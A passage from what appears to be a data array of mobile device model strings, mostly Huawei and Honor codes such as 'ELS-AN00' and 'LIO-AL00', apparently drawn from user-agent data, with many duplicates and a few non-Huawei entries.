G700-U00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI G730-C00', 'HUAWEI MT1-U06', 'HUAWEI MT1-U06', 'HUAWEI MT2-L01', 'HUAWEI MT2-L01', 'HUAWEI MT2-C00', 'HUAWEI MT2-C00', 'MT2L03', 'MT2L03', 'HUAWEI Y360', 'HUAWEI MT7-L09', 'HUAWEI MT7-TL10', 'HUAWEI MT7-TL00', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9200', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-1', 'U9202L-1', 'U9202L-4', 'U9202L-2', 'U9202L-1', 'U9202L-1', 'U9202L-1', 'U9202L-3', 'U9202L-2', 'HUAWEI P6 S-U06', 'HUAWEI P7-L10', 'Flow', 'H1711', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'HUAWEI Y221-U12', 'HUAWEI Y221-U03', 'HUAWEI Y221-U53', 'HUAWEI Y221-U22', 'Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'HUAWEI Y320-U10', 'Bucare Y330-U05', 'Bucare Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'HUAWEI Y330-U05', 'Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'HUAWEI Y530', 'Y550-L03', 'HUAWEI Y560-L01', 'HUAWEI Y541-U02', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'HUAWEI B199', 'Huawei Blaze', 'Huawei BLAZE', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199', 'HUAWEI C199s', 'HUAWEI C199s', 'HW-HUAWEI C199s', 'EC6109V1', 'MTS-SP101', 'MTS-SP101', 'MTS-SP101', 'C8512', 'C8600', 'C8600', 'C8600', 'C8600', 'C8650', 'C8650', 'id C8650', 'HUAWEI C8655', 'HUAWEI C8655', 'C8800', 'HW-HUAWEI_C8810', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI_C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812', 'HUAWEI C8812E', 'HUAWEI_C8812E', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813D', 'HUAWEI C8813DQ', 'HUAWEI C8813DQ', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8813Q', 'HUAWEI C8815', 'HUAWEI C8815', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI_C8816D', 'HUAWEI C8816D', 'HUAWEI C8816D', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817E', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8817L', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8818', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI C8825D', 'HUAWEI-C8850', 'HUAWEI C8860E', 'HUAWEI C8860E', 'HUAWEI C8860E', 'C8860V', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'HUAWEI C8950D', 'CM980', 'CM980', 'd-02K', 'd-02H', 'd-01J', 'U9510', 'U9510', 'HUAWEI D2', 'Huawei D2', 'HUAWEI D8950D', 'MediaPad 10 FHD', 'dtab01', 'EC6108V9-01', 'ART-AL00x', 'ART-AL00x', 'ART-AL00x', 'ART-TL00x', 'ART-AL00m', 'ART-AL00x', 'STK-AL00', 'STK-AL00', 'STK-AL00', 'STK-TL00', 'MED-TL00', 'MED-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-AL00', 'AQM-TL00', 'WKG-AN00', 'WKG-AN00', 'WKG-TN00', 'WKG-TN00', 'FRL-TN00', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-AN00a', 'FRL-TN00', 'FRL-AN00a', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'DVC-AN20', 'DVC-AN20', 'DVC-AN20', 'DVC-TN20', 'DVC-TN20', 'DVC-AN20', 'DVC-TN20', 'MLD-AL00', 'MLD-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'MGA-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'CTR-AL00', 'HUAWEI TAG-L01', 'HUAWEI TAG-L32', 'HUAWEI TAG-AL00', 'HUAWEI TAG-L21', 'HUAWEI TAG-L13', 'HUAWEI TAG-L03', 'NCE-TL10', 'NCE-AL10', 'NCE-AL00', 'NCE-TL10', 'NCE-AL00', 'NCE-AL10', 'DIG-TL10', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'DIG-AL00', 'SLA-TL10', 'SLA-AL00', 'SLA-TL10', 'SLA-TL10', 'TRT-AL00A', 'TRT-TL10A', 'FIG-AL10', 'FIG-TL10', 'FIG-AL00', 'FIG-TL00', 'FIG-AL10', 'LDN-TL20', 'LDN-AL20', 'LDN-AL10', 'LDN-TL00', 'LDN-TL20', 'FLA-AL10', 'FLA-AL10', 'FLA-AL10', 'ATU-AL10', 'DUB-AL00a', 'DUB-AL00a', 'DUB-AL00a', 'MRD-AL00', 'Huawei Enjoy 9s', 'Huawei Enjoy 9s', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'DVC-AN00', 'CM990', 'CM990', 'CM990', 'U8665', 'HUAWEI U8665', 'U8665', 'G735-L03', 'G735-L23', 'G735-L12', 'G735-L23', 'G735-L23', 'CHC-U03', 'CHC-U01', 'Huawei G500 pro', 'HUAWEI G510', 'HUAWEI G510', 'Huawei G510', 'Huawei G520', 'HUAWEI G520 T', 'HUAWEIG520L', 'HUAWEI G520T', 'Huawei G530', 'Huawei G600', 'Huawei G610 u20', 'Huawei G610', 'HUAWEI G610', 'HUAWEI G610 fa', 'HUAWEI G620', 'G621-TL00', 'G621-TL00M', 'G621-TL00', 'HUAWEI G628', 'HUAWEI G7', 'HUAWEI RIO-TL00', 'HUAWEI RIO-UL00', 'HUAWEI_G750', 'Huawei_g750', 'HUAWEI G750', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'HUAWEI G7500', 'Huawei G760', 'HUAWEI RIO-L01', 'HUAWEI VNS-AL00', 'HUAWEI VNS-TL00', 'HUAWEI MLA-TL00', 'HUAWEI MLA-TL00', 'HUAWEI G9 Youth', 'DIG-L21', 'DIG-L22', 'HUAWEI KII-L21', 'BLL-L22', 'BLL-L21', 'BLL-L21', 'HUAWEI NMO-L31', 'HUAWEI RIO-L03', 'H1611', 'H1611', 'H1621', 'H1621', 'HUAWEI H1621', 'H1623', 'H710VL', 'H715BL', 'H866C', 'H866C', 'H866C', 'H866C', 'H866C', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'Huawei-H867G', 'HUAWEI H868C', 'HUAWEIH868C', 'HUAWEI H868C', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H871G', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI H881C', 'HUAWEI_H881C', 'H882L', 'H882L', 'HUAWEI H891L', 'HUAWEI H892L', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'HUAWEI U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'U8860', 'COL-L29', 'COL-AL10', 'COL-L29', 'HRY-LX1', 'HRY-LX1MEB', 'HRY-AL00', 'HRY-AL00a', 'HRY-LX1T', 'HUAWEI U9508', 'HUAWEI U9508', 'HUAWEI U9508', 'YAL-L21', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'LRA-AL00', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-AL10', 'YAL-L41', 'YAL-L41', 'HRY-AL00T', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00Ta', 'HRY-AL00T', 'HRY-AL00Ta', 'YAL-AL50', 'MAR-LX1H', 'MAR-LX1H', 'BMH-AN20', 'BMH-AN10', 'BMH-AN10', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-AN00', 'MXW-TN00', 'MXW-AN00', 'MXW-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN00', 'EBG-AN10', 'EBG-AN10', 'LRA-LX1', 'CDY-NX9A', 'CDY-AN95', 'CDY-AN90', 'HONOR H30-L01M', 'H30-U10', 'H30-T10', 'H30-T00', 'H30-C00', 'Hol-U19', 'Hol-U19', 'Hol-U19', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'HUAWEI G750-T01', 'SCL-AL00', 'SCL-TL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-CL00', 'SCL-TL00H', 'SCL-AL00', 'SCL-AL00', 'CHM-U01', 'Honor 4c Pro', 'Honor 4c pro', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'AQM-AL10', 'Che1-CL20', 'Che2-UL00', 'Che2-TL00M', 'CHE2-TL00', 'CHE-TL00', 'Che1-CL10', 'Che2-TL00', 'CHE-TL00H', 'Che2-L11', 'CUN-AL00', 'CUN-TL00', 'CUN-TL00', 'NTH-AN00', 'NTH-NX9', 'NTH-AN00', 'NTN-L22', 'NTN-LX3', 'NTN-LX1', 'RNA-AN00', 'JLH-AN00', 'JLH-AN00', 'CAM-AL00', 'CAM-TL00', 'CAM-AL00', 'NEM-AL10', 'NEM-L51', 'NEM-UL10', 'NEM-L51', 'NEM-L22', 'KIW-L21', 'KIW-AL10', 'KIW-UL00', 'KIW-TL00', 'H60-L02', 'H60-L04', 'H60-L01', 'H60-L02', 'H60-L03', 'H60-L11', 'H60-L01', 'MYA-TL10', 'huawei mya-tl10', 'PE-UL00', 'PE-TL20', 'PE-UL00', 'PE-TL10', 'PE-UL00', 'PE-TL10', 'GIA-AN00', 'DLI-TL20', 'DLI-L22', 'DLI-L42', 'DIG-L21HN', 'JMM-L22', 'BLN-L21', 'BLN-L22', 'BLN-AL10', 'BLN-AL10', 'BLN-AL30', 'PLK-AL10', 'PLK-UL00', 'PLK-L01', 'PLK-AL10', 'PLK-TL01H', 'PLK-UL00', 'NEM-L21', 'FNE-AN00', 'FNE-AN00', 'FNE-NX9', 'AUM-AL20', 'AUM-L33', 'AUM-AL00', 'AUM-TL20', 'AUM-AL20', 'AUM-L29', 'AUM-L41', 'LND-AL30', 'LND-L29', '720x1358', 'ATH-AL00', 'ATH-CL00', 'ATH-TL00H)', 'ATH-UL00)', 'ATH-AL00', 'ATH-AL00', 'ATH-AL00', 'ATH-TL00H', 'DUA-L22', 'DUA-LX3', 'BND-AL10', 'BND-L21', 'FRD-L09', 'FRD-AL00', 'FRD-L19', 'PRA-AL00X', 'PRA-TL10', 'DUK-L09', 'VEN-L22', 'JAT-L29', 'JAT-LX3', 'JAT-LX1', 'JAT-L41', 'BKK-AL10', 'BKK-LX2', 'BKK-L21', 'BKK-LX2', 'KSA-LX9', 'KSA-LX9', 'JSN-L21', 'JSN-L22', 'JSN-AL00a', 'JSN-L23', 'ARE-AL00', 'ARE-L22HN', 'STF-L09', 'STF-L09S', 'STF-AL10', 'STF-AL10', 'STF-AL00', 'LLD-L31', 'LLD-AL10', 'MOA-LX9N', 'U', '720x1470', 'AKA-L29', 'LLD-AL20', 'LLD-AL30', 'LLD-AL20', 'LLD-AL20', 'DUA-LX9', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00', 'HLK-AL00a', 'HLK-AL00', 'HLK-L42', 'HLK-AL10', 'HLK-L41', 'HLK-AL10', 'HLK-AL10', 'CAM-UL00', 'CAM-UL00', 'NTS-AL00', 'NTS-AL00', 'NTS-AL00', 'TNY-AL00', 'TNY-TL00', 'TNY-AL00', 'TNY-AL00', 'ELZ-AN10', 'ELZ-AN20', 'ANY-LX1', 'LGE-NX9', 'LGE-AN10', 'LGE-AN20', 'MGI-AN00', 'PGT-N19', 'RVL-AL09', 'RVL-AL09', 'RVL-AL09', 'EDI-AL10', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VKY-TL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'VOG-AL00', 'ANA-AL00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-AN00', 'ANA-NX9', 'JDN-W09', 'JDN-AL00', 'JDN-W09', 'AGR-W09HN', 'COR-L29', 'COR-AL10', 'KOZ-AL00', 'KOZ-AL00', 'KOZ-AL00', 'HJC-LX9', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'ASK-AL00x', 'KSA-AL10', 'huawei ksa-al10', 'TNNH-AN00', 'TNNH-AN00', 'TNNH-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'OXP-AN00', 'CHM-TL00', 'CHM-UL00', 'HW-CHM-CL00', 'CHM-UL00', 'CHM-TL00H', 'CHM-UL00', 'CHM-TL00H', 'CHM-TL00', 'CHM-UL00', 'AKA-AL10', 'HJC-AN90', 'NEW-AN90', 'KOZ-AL40', 'KOZ-AL40', 'DUA-AL00', 'DUA-TL00', 'JAT-AL00', 'MOA-AL00', 'MOA-AL00', 'JDN2-AL00HN', 'JDN2-W09HN', 'AGS2-AL00HN', 'BKL-L09', 'BKL-AL20', 'BKL-AL00', 'PCT-TL10', 'PCT-AL10', 'PCT-AL10', 'ALA-AN70', 'KNT-AL10', 'KNT-AL20', 'KNT-AL20', 'KNT-UL10', 'KNT-TL10', 'DUK-AL20', 'DUK-AL20', 'DUK-AL20', 'JMM-AL00', 'JMM-AL10', 'JMM-TL10', 'JMM-AL00', 'BKL-L04', 'PCT-L29', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN00', 'OXF-AN10', 'OXF-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00a', 'TEL-AN00', 'TEL-AN00a', 'TEL-AN10', 'TEL-AN00a', 'TEL-AN00a', 'TEL-TN00', 'TEL-AN10', 'Honor X10 Lite', 'DNN-LX9', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'KKG-AN00', 'Honor X10 Max', 'Honor X10 Pro', 'KKG-AN70', 'TFY-AN00', 'ADT-AN00', 'ADT-AN00', 'DIO-AN00', 'VNA-LX2', 'VNE-LX2', 'VNE-LX1', 'VNE-LX3', 'CMA-LX1', 'CMA-LX2', 'RKY-LX1', 'RKY-LX2', 'RKY-LX3', 'TFY-LX2', 'TFY-LX1', 'TFY-LX3', 'VNE-N41', 'CRT-LX1', 'CRT-LX3', 'CRT-LX2', 'ANY-LX2', 'ANY-LX3', 'ANY-NX1', 'RMO-NX1', 'RMO-NX1', 'HUAWEI SCL-L01', 'HUAWEI SCL-L21', 'HUAWEI LYO-L21', 'LYO-L21', 'Y538', 'Y538', 'Ideos', 'Ideos', 'IDEOS S7', 'IDEOS S7 Slim', 'IDEOS S7 Slim', 'Huawei Ideos X1', 'IDEOS X1', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8500', 'U8510', 'rv:35.0', 'rv:13.0', 'U8510', 'Huawei U8510', 'Huawei IDEOS X3', 'Huawei U8510 X3', 'HUAWEI U8510', 'u8800', 'U8800', 'U8800', 'U8800', 'Huawei Ideos X5', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'U8800', 'Huawei IDEOS X8', 'JNY', 'HUAWEI_M2', 'HUAWEI-M391', 'M650', 'M650', 'M650', 'M660', 'M660', 'M660', 'M660', 'Android 2.3.6', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'HUAWEI-M835', 'Android 2.2.2', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'HUAWEI-M860', 'Huawei M865', 'USCCADR3305', 'USCCADR3305', 'M865', 'USCCADR3305', 'M865', 'M865', 'M865', 'M865', 'Android 2.3.6', 'M865C', 'M865C', 'M865C', 'M865C', 'USCCADR3310', 'USCCADR3310', 'USCCADR3310', 'M866', 'HUAWEI M866', 'USCCADR3310', 'M866', 'HUAWEI M866', 'M866', 'USCCADR3310', 'HUAWEI M868', 'HUAWEI M881', 'HUAWEI M881', 'M886', 'M886', 'M886', 'M886', 'M886', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M920', 'HUAWEI-M921', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI-M931', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI RIO-AL00', 'HUAWEI MLA-AL10', 'HUAWEI MLA-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'POT-AL10', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TNN-AN00', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'TYH601M', 'ALP-AL00', 'ALP-L29', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'ALP-AL00', 'RNE-L21', 'RNE-L01', 'RNE-L23', 'BLA-L29', 'BLA-L09', 'BLA-A09', 'BLA-AL00', 'HMA-L29', 'HMA-L09', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-AL00', 'HMA-L29', 'SNE-LX1', 'SNE-LX3', 'LYA-L29', 'LYA-L09', 'LYA-AL00', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'LYA-AL00P', 'EVR-AN00', 'EVR-AL00', 'EVR-AN00', 'EVR-L29', 'EVR-AL00', 'EVR-AL00', 'EVR-N29', 'TAS-AL00', 'TAS-AL00', 'TAS-L29', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AL00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'TAS-AN00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'SPN-AL00', 'LIO-L29', 'LIO-AN00', 'LIO-L29', 'LIO-AN00', 'LIO-AL00', 'LIO-AN00', 'LIO-AN00', 'LIO-AL00', 'LIO-N29', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'LIO-AN00P', 'Mate30 RS', 'LIO-AN00P', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'LIO-AN00m', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'OCE-AN10', 'NOH-AL10', 'NOH-NX9', 'NOH-AN00', 'NOH-AN00', 'NOH-AL10', 'NOH-AN01', 'NOH-AN00', 'NOH-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'NOP-AN00', 'Mate 40 RS', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'OCE-AL50', 'OCE-AN50', 'OCE-AN50', 'OCE-AN50', 'CET-AL00', 'CET-LX9', 'CET-AL00', 'HUAWEI Mate 50', 'CET-AL00', 'DCO-AL00', 'CET-AL60', 'CET-AL60', 'HUAWEI MATE 7', 'HUAWEI NXT-AL10', 'HUAWEI NXT-L29', 'MHA-L29', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-AL00', 'MHA-L09', 'BLL-L23', 'LON-L29', 'LON-AL00', 'LON-AL00-PD', 'LON-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-AL00', 'NEO-L29', 'HUAWEI CRR-UL00', 'HUAWEI CRR-L09', 'HUAWEI CRR-UL20', 'HUAWEI CRR-CL00', 'BND-L34', 'TAH-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN10', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN00', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TET-AN50', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'TAH-AN00m', 'PAL-LX9', 'PAL-AL00', 'PAL-AL00', 'PAL-AL00', 'HUAWEI Mate30', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'DBY-W09', 'MON-AL19', 'MON-W19', 'GOT-AL09', 'GOT-AL09', 'GOT-AL09', 'GOT-W29', 'GOT-W29', 'AGS3-L09', 'HUAWEI MediaPad', 'HUAWEI MediaPad', '403HW', 'HUAWEI MediaPad', 'S8-306L', 'HUAWEI MediaPad', 'Huawei MediaPad', 'X1 7.0', 'Huawei MediaPad', 'S8-701w', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MediaPad 7 Lite', 'MON-AL19B', 'MON-AL19B', 'MON-AL19B', 'BTV-DL09', 'BTV-W09', 'BAH-W09', 'CPN-L09', 'CPN-AL00', 'CPN-W09', 'BAH-L09', 'BAH2-W19', 'JDN2-L09', 'BAH2-L09', 'BAH2-AL10', 'AGR-L09', 'KOB2-L03', 'T1-A21w', 'T1-A21L', 'T1-A23L', 'T1-701u', 'T1-701u', 'T1-823L', 'T1-823L', 'T1-821w', 'MediaPad T1 8.0', 'AGS-W09', 'AGS-L09', 'AGS-L03', 'BG2-U01', 'BG2-W09', 'KOB-L09', 'BZK-L00', 'KOB-W09', 'AGS2-L09', 'AGS2-W09', 'GEM-701L', 'GEM-703L', 'GEM-702L', 'Nexus 6P', 'Nexus 6P', 'HUAWEI CAN-L11', 'HUAWEI CAN-L12', 'HUAWEI CAN-L01', 'HUAWEI CAZ-AL10', '1080x1788', 'NCO-LX1', 'NCO-AL00', 'GLA-LX1', 'GLA-AL00', 'PIC-TL00', 'PIC-LX9', 'PIC-AL00', '704HW', 'BAC-L03', 'BAC-TL00', 'BAC-L01', 'BAC-TL00', 'BAC-AL00', 'BAC-L22', 'BAC-L21', 'BAC-AL00', 'BAC-L21', 'RNE-L22', 'HWI-AL00', 'HWI-AL00', 'HWI-AL00', 'HWI-TL00', 'HWI-AL00', 'PAR-LX1', 'PAR-AL00', 'PAR-LX9', 'PAR-AL00', 'ANE-AL00', 'INE-LX2', 'INE-LX2r', 'VCE-L22', 'VCE-TL00', 'VCE-AL00', 'VCE-AL00', 'VCE-AL00', 'MAR-AL00', 'MAR-AL00', 'MAR-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL00', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'SEA-AL10', 'GLK-AL00', 'GLK-TL00', 'GLK-TL00', 'GLK-LX1U', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'GLK-AL00', 'SPN-TL00', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AL10', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'WLZ-AN00', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JNY-AL10', 'JEF-TN00', 'JEF-NX9', 'JEF-AN20', 'JEF-AN00', 'JEF-AN20', 'JEF-AN00', 'JER-AN20', 'JER-AN10', 'JER-TN10', 'JER-AN10', 'JER-AN10', 'JER-AN20', 'JER-AN10', 'CDL-AN50', 'CDY-NX9B', 'CDY-AN00', 'CDY-AN00', 'JNY-LX2', 'ANG-LX2', 'ANG-LX1', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'ANG-AN00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AL00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'BRQ-AN00', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AL50', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'JSC-AN00', 'CHL-AL60', 'CHL-AL60', 'NEN-LX1', 'NEN-L22', 'NAM-LX9', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'RTE-AL00', 'JLN-LX1', 'JLN-LX3', '608HW', 'PRA-LX2', 'PRA-LX3', 'HUAWEI MLA-L11', 'DIG-L01', 'WAS-AL00', 'FIG-LX1', 'FIG-LX2', 'FIG-LX3', 'POT-LX1', 'POT-LX3', 'POT-LX2J', 'POT-LX1AF', 'POT-LX1T', 'PPA-LX2', 'PPA-LX1', 'P Smart S', 'STK-LX1', 'MZ-STK-LX1', 'VTR-L09', 'VTR-L29', 'VTR-AL00', 'WAS-LX1A', 'WAS-TL10', 'VKY-AL00', 'VKY-L09', 'VKY-L29', 'BAC-L23', 'HUAWEI P11', 'EML-L09', 'EML-L29', 'EML-AL00', 'EML-AL00', 'EML-L29', 'ANE-LX1', 'ANE-LX2', 'ANE-LX3', 'ANE-LX2J', 'CLT-L29', 'CLT-AL00', 'CLT-L09', 'CLT-L04', 'CLT-AL00', 'ELE-AL00', 'ELE-L09', 'ELE-AL00', 'ELE-L29', 'ELE-L04', 'ELE-AL00', 'MAR-LX1A', 'MAR-LX1M', 'MAR-LX1A', 'MAR-LX2', 'MAR-LX3A', 'MAR-LX1B', 'VOG-AL10', 'VOG-L29', 'VOG-L09', 'HUAWEI P30PRO', 'ANA-LX4', 'JNY-LX1', 'ART-L29', 'ART-L29N', 'ELS-NX9', 'ELS-AN00', 'ELS-AN00', 'ELS-AN00', 'ELS-AN10', 'ELS-AN10', 'ELS-N39', 'ELS-AN10', 'ABR-LX9', 'ABR-AL00', 'Huawei P50', 'ABR-AL00', 'BAL-L49', 'BAL-AL00', 'JAD-AL50', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL90', 'ABR-AL60', 'ABR-AL60', 'ABR-AL60', 'HUAWEI P6-U06', 'HUAWEI P6s', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI P7 mini', 'HUAWEI GRA-L09', 'HUAWEI GRA-UL00', 'ALE-L21', 'ALE-L23', 'ALE-L21', 'ALE-L21', 'PRA-LX1', 'PRA-LA1', 'HUAWEI P8max', 'HUAWEI GRA-UL10', 'HUAWEI-P8Lite', 'HUAWEI-P8Lite', 'EVA-L09', 'EVA-DL00', 'EVA-L19', 'EVA-AL00', 'EVA-AL10', 'HUAWEI VNS-L31', 'HUAWEI VNS-L21', 'HUAWEI VNS-L22', 'SLA-L22', 'SLA-L02', 'HUAWEI VNS-L52', 'HUAWEI VNS-L52', 'DIG-L03', 'DIG-L23', 'VIE-L29', 'VIE-L09', 'VIE-AL10', 'VIE-AL10', 'SM-A336B', 'SM-A536E', 'M2101K6R', 'SM-A307G', 'SM-A528B', 'LM-K200', '2201116SG', 'SM-A107M', 'CPH2239', 'SM-A205G', 'M2004J19C', 'M2102J20SG', 'SM-A336M', 'SM-A127M', 'SM-G975U', 'SM-A730F', 'SM-G950F', 'M2007J20CG', 'T671E', 'HUAWEI_Q201', 'Huawei S7', 'HUAWEI-S7', 